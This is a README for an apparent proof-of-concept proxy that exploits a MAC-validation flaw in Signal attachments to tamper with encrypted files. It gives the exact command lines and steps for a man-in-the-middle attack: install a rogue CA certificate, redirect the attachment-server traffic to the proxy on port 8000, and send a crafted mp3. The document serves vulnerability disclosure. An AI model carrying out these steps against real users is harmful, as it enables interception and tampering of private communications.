# Signal Attack Proxy

This is a PoC the vulnerabilities found in the [Signal Private Messenger](https://whispersystems.org). It is acting as a proxy and will modify encrypted attachments in a way so that the MAC validation is bypassed and 4GB of data is attached.

You can specify ranges of blocks to attach to the original attachment. E.g. the ranges "0-100,1000-2000,0-100" would append blocks 0 to 100 followed by blocks 1000-2000 and then again 0-100 to the attachment. Blocks are AES blocks of 16bytes.

## Example Demonstrating the MP3 Robustness

./reorder.py notanissue.mp3 0-2700,4000-4320,4500-6320,6800-7400,6800-7400,6800-7400,6800-7400,4500-5380,6800-7400,2000-2750,4500-5380,2700-2850,7000-7450,2000-2750,4500-5380,2700-2850,7000-7450,2000-2750,4500-5380,2700-2850,7000-7450,2000-2750,4500-5380,2700-2850,7000-7450,2000-2750,4500-5380,2700-2850,7000-7450,2000-2750,4500-5380,2700-2850,7000-7450,2000-2750,4500-5380,2700-2850,7000-7450,2000-2750,4500-5380,2700-2850,7000-7450,2000-2750,4500-5380,2700-2850,7000-7450,2000-2750,4500-5380,2700-2850,7000-7450,2000-2750,4500-5380,2700-2850,7000-7450,2000-2750,4500-5380,2700-2850,7000-7450,2000-2750,4500-5380,2700-2850,7000-7450,2000-2750,4500-5380,2700-2850,7000-7450,2000-2750,4500-5380,2700-2850,7000-7450,2000-2750,4500-5380,2700-2850,7000-7450,2000-2750,4500-5380,2700-2850,7000-7450,2000-2750,4500-5380,2700-2850,7000-7450  > test.mp

mplayer test.mp3


## Example Attack Against Signal

./sap-thatsnotwhatisaid.py --encoding <encoding (gzip only)> --blocks <range1>,<range2>

To recreate the video found at https://www.youtube.com/watch?v=brN6D9Fc4dc do the following:

  1. Install a rouge CA certificate on your Android device (or use a real one if you got one ;)
  2. Start the proxy using the cmdline sap-thatsnotwhatisaid.py --encoding gzip --blocks 0-2700,4000-4320,4500-6320,6800-7400,6800-7400,6800-7400,6800-7400,4500-5380,6800-7400,2000-2750,4500-5380,2700-2850,7000-7450,2000-2750,4500-5380,2700-2850,7000-7450,2000-2750,4500-5380,2700-2850,7000-7450,2000-2750,4500-5380,2700-2850,7000-7450,2000-2750,4500-5380,2700-2850,7000-7450,2000-2750,4500-5380,2700-2850,7000-7450,2000-2750,4500-5380,2700-2850,7000-7450,2000-2750,4500-5380
  3. Intercept the request to the Signal attachment server and forward it to the host running sap-thatsnotwhatisaid.py, port 8000.
  4. Send the notanissue.mp3 from another signal contact to the Android device.
  5. Profit.

